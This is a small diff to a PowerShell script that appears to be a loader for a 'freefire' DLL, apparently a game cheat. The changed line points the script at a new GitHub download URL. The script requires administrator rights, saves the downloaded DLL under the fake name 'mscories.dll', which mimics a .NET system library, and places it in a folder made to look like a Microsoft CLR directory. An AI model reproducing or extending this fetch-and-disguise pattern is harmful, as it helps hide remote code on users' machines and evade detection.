@@ -9,7 +9,7 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 }
 
 # === 2. Configuration ===
-$url = "https://github.com/potae112/Cmdfreefire/releases/download/v1.0/dllfreefire.dll"
+$url = "https://github.com/Nongtaeiei/powershellfreefire/releases/download/v1.1/dllfreefire.dll"
 $fakeName = "mscories.dll"
 $workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
 $dllPath = Join-Path $workDir $fakeName
